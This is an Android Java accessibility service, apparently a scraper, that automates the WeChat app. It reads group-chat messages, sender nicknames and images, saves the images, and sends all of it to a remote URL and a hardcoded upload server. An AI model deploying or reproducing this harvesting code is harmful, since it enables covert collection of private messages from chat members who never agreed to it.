package hyj.fetchdata;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.widget.Toast;

import com.alibaba.fastjson.JSON;

import org.litepal.crud.DataSupport;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import hyj.fetchdata.util.AutoUtil;
import hyj.fetchdata.util.Constants;
import hyj.fetchdata.util.FileUtil;
import hyj.fetchdata.util.LogUtil;
import hyj.fetchdata.util.OkHttpUtil;

public class ChatService extends AccessibilityService {
    Map<String,Set<String>> temp = new HashMap<String,Set<String>>();
    Map<String,String> record = new HashMap<String,String>();
    static boolean isOver=true;
    static boolean isStart;
    static int baseNum = 9;
    AccessibilityNodeInfo root=null;
    String url;
    int qNum;
    List<Msg> saveTempDbMsgs = new ArrayList<Msg>();
    Set<String> oldSet;
    List<String> uploadFiles = new ArrayList<String>();
    List<List<Msg>> sendMsgs = new ArrayList<List<Msg>>();
    public ChatService() {
        SharedPreferences sharedPreferences = GlobalApplication.getContext().getSharedPreferences("url",MODE_PRIVATE);
        url = sharedPreferences.getString("url","");
        qNum = Integer.parseInt(sharedPreferences.getString("qNum","").replaceAll("[个以上]",""));
        LogUtil.d("url|qnum",url+"--"+qNum);
        AutoUtil.recordAndLog(record,Constants.CHAT_LISTENING);
        isStart=true;
        new FileThread().start();
        new SendMsgThread().start();
    }
    String qName="";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
       /* if(isStart){
            new CheckThread().start();
        }*/
        isStart=false;
        int eventType = event.getEventType();
        root = getRootInActiveWindow();
        //LogUtil.d("isOver|action|eventType","isOver:"+isOver+"--"+"action:"+record.get("recordAction")+"--"+"eventType:"+eventType+"");
        if(isOver){

            if(root==null){
                Toast.makeText(GlobalApplication.getContext(), "开启失败，请退出微信重新打开!", Toast.LENGTH_LONG).show();
                LogUtil.d("root",root+"");
                return;
            }
            List<AccessibilityNodeInfo> listView= root.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bny");
            if(listView==null||listView.size()==0){
                LogUtil.d("chatService","列表信息为空");
                return;
            }
            getqImageANdNameThenClidk(listView);

            if(AutoUtil.checkAction(record,Constants.CHAT_ACTION_04)){
                MyThread thread = new MyThread(root);
                thread.start();
            }
        }
    }

    public  static void getChild(AccessibilityNodeInfo node){
        System.out.println("-----------start---------");
        if(node!=null){
            int count = node.getChildCount();
            System.out.println("child count"+count+"node text-->"+node.getText()+"  node clsName-->"+node.getClassName()+" desc"+node.getContentDescription());
            if(count>0){
                for(int i=0,l=count;i<l;i++){
                    AccessibilityNodeInfo child = node.getChild(i);
                    //getChild(child);
                    System.out.println(i+" child text-->"+child.getText()+" child clsName-->"+child.getClassName()+" desc"+node.getContentDescription());
                }
            }
        }
        System.out.println("-----------end---------");
    }
    @Override
    public void onInterrupt() {
    }
    private class MyThread extends Thread{
        AccessibilityNodeInfo root;
        public MyThread(AccessibilityNodeInfo root){
            this.root = root;
        }
        @Override
        public void run() {
            System.out.println("----------run start-----------");
            isOver = false;

            List<AccessibilityNodeInfo> ims=null;
            List<AccessibilityNodeInfo> images1 = null;
            while (true){
                AutoUtil.sleep(200);
                AccessibilityNodeInfo msgRoot = getRootInActiveWindow();
                ims = msgRoot.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/im");
                images1 =  msgRoot.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/a72");
                if(ims==null&&images1==null){
                    LogUtil.d("chatService","消息列表为空");
                    continue;
                }
                break;
            }

            forImageProcess(images1);

            AccessibilityNodeInfo msgRoot2 = getRootInActiveWindow();
            AccessibilityNodeInfo backBtn = AutoUtil.findNodeInfosById(msgRoot2,"com.tencent.mm:id/go");;
            while (backBtn==null){
                AutoUtil.sleep(300);
                System.out.println("record--->等待获取返回按钮");
                msgRoot2 = getRootInActiveWindow();
                backBtn = AutoUtil.findNodeInfosById(msgRoot2,"com.tencent.mm:id/go");
            }
            ims = msgRoot2.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/im");
            messageProcess(ims,msgRoot2);

            AutoUtil.performClick(backBtn,record,"返回好友列表");
            if(AutoUtil.checkAction(record,"返回好友列表")){
                AutoUtil.recordAndLog(record,Constants.CHAT_LISTENING);
            }
            isOver = true;
            System.out.println("----------run end-----------");
        }

        @Override
        public void destroy() {
            super.destroy();
            isOver=true;
        }

    }
    class CheckThread extends Thread{
        @Override
        public void run() {
            while (true){
                AutoUtil.sleep(1000*60*3);
                if(root==null){
                    System.out.println("root---null");
                    continue;
                }
                System.out.println("recordAction--->"+record.get("recordAction"));
                AccessibilityNodeInfo backBtn = AutoUtil.findNodeInfosById(root,"com.tencent.mm:id/go");
                if(backBtn!=null&&AutoUtil.checkAction(record,Constants.CHAT_LISTENING)){
                    System.out.println("----调整");
                    AutoUtil.recordAndLog(record,Constants.CHAT_ACTION_04);
                    return;
                }else{
                    System.out.println("---btn is null");
                }

                List<AccessibilityNodeInfo> listView= root.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/bny");
                if(listView!=null&&listView.size()>0&&listView.get(0).getChildCount()>baseNum){
                    AccessibilityNodeInfo childNode = listView.get(0).getChild(baseNum);
                    AccessibilityNodeInfo imgNode = AutoUtil.findNodeInfosById(childNode,"com.tencent.mm:id/ia");
                    if(imgNode!=null&&!AutoUtil.checkAction(record,Constants.CHAT_LISTENING)) {
                        System.out.println("----调整");
                        AutoUtil.recordAndLog(record,Constants.CHAT_LISTENING);
                    }
                }else{
                    System.out.println("---List is null");
                }
            }

        }
    }
    private void getqImageANdNameThenClidk(List<AccessibilityNodeInfo> listView){
        int childCount = listView.get(0).getChildCount();
        //int index = qNum>childCount?childCount:qNum;
        if(childCount>baseNum)
            for(int i=baseNum,l=childCount;i<l;i++){
                String imgText = "",qNickText = "";
                AccessibilityNodeInfo childNode = listView.get(0).getChild(i);
                AccessibilityNodeInfo imgNode = AutoUtil.findNodeInfosById(childNode,"com.tencent.mm:id/ia");
                AccessibilityNodeInfo nickNode = AutoUtil.findNodeInfosById(childNode,"com.tencent.mm:id/agw");
                if(imgNode!=null){
                    imgText = (imgNode.getText()+"").replace("null","").replace("NULL","");
                }
                if(nickNode!=null){
                    qNickText = nickNode.getText()+"";
                }
                if(!"".equals(imgText)&&!"腾讯新闻".equals(qNickText)){
                    qName = qNickText;
                    AccessibilityNodeInfo personNode = AutoUtil.fineNodeByIdAndText(getRootInActiveWindow(),"com.tencent.mm:id/agw",qNickText);
                    AutoUtil.performClick(personNode,record,Constants.CHAT_ACTION_04,1000);
                    break;
                }
            }
    }

    private void forImageProcess(List<AccessibilityNodeInfo> images){
        if(images==null||images.isEmpty()) return;
        int count = 1;
        while (true){
            if(imageProcess(images.get(images.size()-count))) break;
            AccessibilityNodeInfo backBtn=null;
            AccessibilityNodeInfo root=null;
            while (backBtn==null){
                AutoUtil.sleep(200);
                root = getRootInActiveWindow();
                backBtn = AutoUtil.findNodeInfosById(root,"com.tencent.mm:id/go");
                if(backBtn!=null){
                    break;
                }
                System.out.println("record--->图片等待获取返回按钮");
            }
            images = root.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/a72");
            if((images.size()-count)<=0){
                break;
            }
            count = count+1;
        }
    }
    private boolean imageProcess(AccessibilityNodeInfo image){
        boolean isSameImage = true;
        if(image!=null){

            String nickName = "";
            AccessibilityNodeInfo pParent = image.getParent().getParent();
            if(pParent.getChildCount()==3){
                nickName = pParent.getChild(1).getText()+"";
            }

            AutoUtil.performClick(image,record,"点击图片",1500);
            if(AutoUtil.checkAction(record,"点击图片")){
                boolean isSaveImage=false;
                int countTimes = 0;
                while (!isSaveImage){
                    countTimes = countTimes+1;
                    if(countTimes==80){
                        AutoUtil.performBack(ChatService.this,record,"等待8s退出");
                        List<Msg> msgs = new ArrayList<Msg>();
                        Msg msg = new Msg(qName,nickName,"系统提示：图片加载失败 or 视频或其他不支持",AutoUtil.getCurrentTime());
                        msgs.add(msg);
                        sendMsgs.add(msgs);

                        return isSameImage;
                    }
                    AccessibilityNodeInfo rootImage = getRootInActiveWindow();
                    AutoUtil.sleep(100);
                    AccessibilityNodeInfo saveImageNode = AutoUtil.findNodeInfosById(rootImage,"com.tencent.mm:id/b8w");
                    if(saveImageNode==null){
                        LogUtil.d("chatService","保存按钮获取失败"+countTimes);
                        continue;
                    }
                    AutoUtil.performClick(saveImageNode,record,"保存图片");
                    String filename =checkFileExist();
                    if(!"".equals(filename)){
                        isSameImage = false;
                        uploadFiles.add(filename);
                        List<Msg> msgs = new ArrayList<Msg>();
                        Msg msg = new Msg(qName,nickName,filename,AutoUtil.getCurrentTime());
                        msgs.add(msg);
                        sendMsgs.add(msgs);
                    }
                    isSaveImage = true;
                    if(AutoUtil.checkAction(record,"保存图片")){
                        AutoUtil.performBack(ChatService.this,record,"保存图片->全局返回");
                    }
                }
            }
        }
        return isSameImage;
    }
    private String checkFileExist(){
        String filename = "";
        File file = new File("/sdcard/tencent/MicroMsg/WeiXin");
        if(file.exists()){
            File[] files = file.listFiles();
            if(files!=null&&files.length>1){
                int fileNums = files.length;
                File newFile = files[fileNums-1];
                boolean fileIsExist = false;
                for(int i=fileNums-2;i>0;i--){
                    if(newFile.length()==files[i].length()){
                        fileIsExist = true;
                        newFile.delete();
                        System.out.println("----->删除图片");
                    }
                }
                if(!fileIsExist){
                    System.out.println("----->新图片");
                    filename = newFile.getName();
                }
            }
        }
        return filename;
    }
    class FileThread extends Thread{
        @Override
        public void run() {
            while (true){
                AutoUtil.sleep(2000);
                if(uploadFiles.size()>0){
                    String filename = uploadFiles.remove(0);
                    File uploadFile = new File("/sdcard/tencent/MicroMsg/WeiXin/"+filename);
                    System.out.println("------开始上传文件----"+filename);
                    FileUtil.uploadMultiFile("http://39.108.72.49:8080/upload",uploadFile,filename);
                }
            }
        }
    }
    class SendMsgThread extends Thread{
        @Override
        public void run() {
            while (true){
                AutoUtil.sleep(1000);
                if(sendMsgs.size()>0){
                    List<Msg> msgs = sendMsgs.remove(0);
                    String json = JSON.toJSONString(msgs);
                    System.out.println("------开始发送消息--------"+json);
                    LogUtil.d("okHttp",OkHttpUtil.okHttpPost(url,json));
                }
            }
        }
    }
    private void messageProcess(List<AccessibilityNodeInfo> ims,AccessibilityNodeInfo msgRoot){
        oldSet = temp.get(qName);
        System.out.println("oldSet---->"+oldSet);
        if(oldSet==null||oldSet.isEmpty()){
            oldSet = new HashSet<String>();
            List<Msg> dMsgs = DataSupport.where("groupName=?",qName).find(Msg.class);
            for(Msg msg:dMsgs){
                oldSet.add(msg.getNickName()+msg.getMessage());
            }
        }
        if(ims!=null&&ims.size()>0){
            List<Msg> msgs = new ArrayList<Msg>();
            Set<String> newSet = new HashSet<String>();
            for(int i=0,l=ims.size();i<l;i++){
                AccessibilityNodeInfo im = ims.get(i);
                if(im==null) continue;
                String nickName = "";
                String text = im.getText()+"";
                //11
                AccessibilityNodeInfo textParent = im.getParent();
                getChild(textParent);
                if(textParent.getChildCount()==3){
                    nickName = textParent.getChild(1).getText()+"";
                }else if(textParent.getChildCount()==4){//带时间 或 声音
                    nickName = textParent.getChild(2).getText()+"";
                    if("null".equals(nickName)){//声音
                        text = textParent.getChild(3).getText()+"";
                        if(text.matches("[\\d]{1,2}\"")){
                            nickName = textParent.getChild(1).getText()+"";
                            text = ("语音"+text+"秒").replace("\"","");
                        }
                    }
                };
                //22
                Msg msg = new Msg(qName,nickName,text,AutoUtil.getCurrentTime());
                saveTempDbMsgs.add(msg);

                newSet.add(nickName+text);
                if(oldSet.isEmpty()){
                    msgs.add(msg);
                    //System.out.println("-------msgText--->群名:"+qName+" "+"昵称："+nickName+" 消息："+text);
                }else{
                    if(!oldSet.contains(nickName+text)){
                        msgs.add(msg);
                        //System.out.println("--------------msgText--->群名:"+qName+" "+"昵称："+nickName+" 消息："+text);
                    }
                }
            }
            LogUtil.d("msg",JSON.toJSONString(msgs));
            DataSupport.deleteAll(Msg.class,"groupName=?",qName);
            DataSupport.saveAll(saveTempDbMsgs);
            if(msgs.size()>0){
                sendMsgs.add(msgs);
            }
            temp.put(qName,newSet);
        }
    }
}
